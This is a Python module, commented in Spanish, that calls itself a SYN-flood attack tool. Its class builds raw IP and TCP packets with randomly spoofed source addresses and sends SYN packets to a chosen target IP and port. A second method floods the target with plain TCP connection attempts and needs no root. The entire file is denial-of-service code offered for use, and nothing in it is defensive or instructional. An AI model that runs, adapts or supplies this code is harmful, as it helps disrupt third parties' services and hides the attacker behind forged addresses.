#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SYN-Flood Attack Module
Envía paquetes SYN malformados para abrumar la tabla de conexiones
"""

import socket
import random
import struct
import textwrap


class SYNFlood:
    """Implementa ataque SYN-Flood"""

    def __init__(self, target, port=80):
        """
        Inicializa el ataque SYN-Flood
        
        Args:
            target: IP objetivo
            port: Puerto objetivo (default 80)
        """
        self.target = target
        self.port = port
        self.timeout = 2

    def _generate_random_ip(self):
        """Genera una IP origen aleatoria (spoofing)"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def _generate_random_port(self):
        """Genera un puerto origen aleatorio"""
        return random.randint(1024, 65535)

    def _calculate_checksum(self, data):
        """Calcula checksum para paquetes IP/TCP"""
        if len(data) % 2 != 0:
            data += b'\0'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = ~checksum & 0xffff
        return checksum

    def _build_ip_header(self, src_ip, dst_ip):
        """Construye encabezado IP"""
        version_header_length = 69  # 4 bits version (4) + 4 bits header length (5)
        ttl = 255
        protocol = 6  # TCP
        
        src_ip_packed = socket.inet_aton(src_ip)
        dst_ip_packed = socket.inet_aton(dst_ip)
        
        # Placeholder para checksum
        checksum = 0
        
        ip_header = struct.pack(
            '!BHHHBBH4s4s',
            version_header_length,
            0,  # Type of Service
            0,  # Total Length (se calcula después)
            random.randint(1, 65535),  # Identification
            0,  # Flags and Fragment Offset
            ttl,
            protocol,
            checksum,
            src_ip_packed,
            dst_ip_packed
        )
        
        return ip_header

    def _build_tcp_header(self, src_port, dst_port, seq_num=None, ack_num=0):
        """Construye encabezado TCP con flag SYN"""
        if seq_num is None:
            seq_num = random.randint(0, 0xffffffff)
        
        # Flags: SYN = 0x02
        flags = 0x02
        window_size = 65535
        
        # Placeholder para checksum
        checksum = 0
        
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            src_port,
            dst_port,
            seq_num,
            ack_num,
            (5 << 4) + 0,  # Data offset (5) + reserved (0)
            flags,
            window_size,
            checksum,
            0  # Urgent pointer
        )
        
        return tcp_header

    def send_syn_packet(self):
        """
        Envía un paquete SYN malformado
        Nota: Requiere permisos de root/administrador
        """
        try:
            # Crear socket raw (requiere permisos elevados)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.settimeout(self.timeout)

            # Generar IPs y puertos aleatorios
            src_ip = self._generate_random_ip()
            src_port = self._generate_random_port()
            
            # Construir headers
            ip_header = self._build_ip_header(src_ip, self.target)
            tcp_header = self._build_tcp_header(src_port, self.port)
            
            # Combinar headers
            packet = ip_header + tcp_header
            
            # Enviar paquete
            sock.sendto(packet, (self.target, self.port))
            sock.close()
            
            return True

        except PermissionError:
            raise Exception("SYN-Flood requiere permisos de administrador/root")
        except socket.error as e:
            raise Exception(f"Error de socket: {e}")
        except Exception as e:
            raise Exception(f"Error en SYN-Flood: {e}")

    def send_syn_packet_simple(self):
        """
        Versión simplificada que usa sockets TCP normales
        Menos efectiva pero no requiere permisos especiales
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Intentar conectar (envía SYN)
            try:
                sock.connect((self.target, self.port))
            except (socket.timeout, ConnectionRefusedError):
                pass
            finally:
                sock.close()
            
            return True

        except Exception as e:
            raise Exception(f"Error: {e}")
